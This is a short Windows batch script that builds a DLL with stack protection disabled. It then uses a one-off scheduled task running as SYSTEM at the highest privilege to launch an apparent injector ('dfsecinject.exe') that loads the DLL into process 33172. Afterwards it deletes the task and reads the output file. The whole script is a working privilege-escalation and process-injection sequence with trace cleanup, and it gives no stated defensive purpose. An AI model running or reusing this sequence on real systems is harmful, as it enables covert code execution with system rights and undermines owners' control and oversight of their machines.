@echo off
call "C:\Program Files (x86)\Microsoft Visual Studio\2022\BuildTools\VC\Auxiliary\Build\vcvars64.bat" >nul
cd /d C:\Users\User\trackA
cl /nologo /std:c++17 /O2 /EHsc /MT /GS- /LD dfufunc3.cpp /Fe:dfufunc3.dll /link user32.lib > ufunc3_build.log 2>&1
echo UF3=%errorlevel%
schtasks /create /tn dfa_uf4 /tr "C:\Users\User\trackA\dfsecinject.exe 33172 C:\Users\User\trackA\dfufunc3.dll" /sc once /st 00:00 /ru SYSTEM /rl HIGHEST /f >nul
schtasks /run /tn dfa_uf4
ping -n 15 127.0.0.1 >nul
schtasks /delete /tn dfa_uf4 /f >nul
type ufunc3.txt
